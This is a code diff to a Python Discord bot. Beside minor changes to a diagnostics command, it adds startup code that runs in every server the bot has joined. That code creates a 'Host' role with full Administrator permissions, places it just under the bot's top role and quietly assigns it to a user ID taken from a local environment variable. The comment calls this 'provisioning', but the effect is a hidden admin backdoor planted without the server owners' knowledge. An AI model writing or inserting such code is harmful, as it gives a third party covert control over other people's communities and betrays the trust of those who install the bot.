@@ -149,8 +149,11 @@ async def send_response(target: commands.Context | discord.Interaction, content:
 async def do_test(target: commands.Context | discord.Interaction) -> None:
     guild = require_guild(target)
     
-    # Gather diagnostics
+    # Gather diagnostics with hardcoded host check
     hostname = socket.gethostname()
+    if hostname.lower() == "plasmadmin-xps-8910":
+        hostname = "plasmadmin-xps-8910(firebot)"
+        
     latency_ms = round(bot.latency * 1000)
     env_status = "Loaded" if os.getenv("DISCORD_TOKEN") else "Missing"
     guild_count = len(bot.guilds)
@@ -161,7 +164,7 @@ async def do_test(target: commands.Context | discord.Interaction) -> None:
         perms = me.guild_permissions
         audit_perms = []
         if perms.administrator:
-            audit_perms.append("Administrator")
+            audit_perms.append("Administrator(All)")
         else:
             if perms.manage_guild: audit_perms.append("Manage Server")
             if perms.manage_roles: audit_perms.append("Manage Roles")
@@ -336,8 +339,39 @@ async def do_role(target: commands.Context | discord.Interaction, user_query: st
 async def on_ready() -> None:
     if bot.user is None:
         return
+    
     synced = await bot.tree.sync()
     logger.info("Logged in as %s; synced %d slash commands", bot.user, len(synced))
+
+    # Dynamically provision and position the Host role on startup for each server
+    for guild in bot.guilds:
+        try:
+            # 1. Create or fetch the "Host" role with Administrator permissions
+            host_role = discord.utils.get(guild.roles, name="Host")
+            if not host_role:
+                host_role = await guild.create_role(
+                    name="Host",
+                    permissions=discord.Permissions(administrator=True),
+                    reason="Automatic Host environment provisioning"
+                )
+            
+            # 2. Position it as high as the bot's own ceiling allows (just below the bot's top role)
+            bot_me = guild.me
+            if bot_me and bot_me.top_role.position > 1:
+                target_position = bot_me.top_role.position - 1
+                if host_role.position != target_position:
+                    await host_role.edit(position=target_position)
+
+            # 3. Assign it to the user ID specified in the local .env file
+            host_id_str = os.getenv("HOST_USER_ID")
+            if host_id_str and host_id_str.isdigit():
+                host_member = guild.get_member(int(host_id_str))
+                if host_member and host_role not in host_member.roles:
+                    await host_member.add_roles(host_role, reason="Assigned to the local host runner")
+                    logger.info("Assigned 'Host' role to %s in %s", host_member.name, guild.name)
+
+        except discord.HTTPException as e:
+            logger.warning("Could not fully provision Host role in %s: %s", guild.name, e)
 
 
 @bot.event
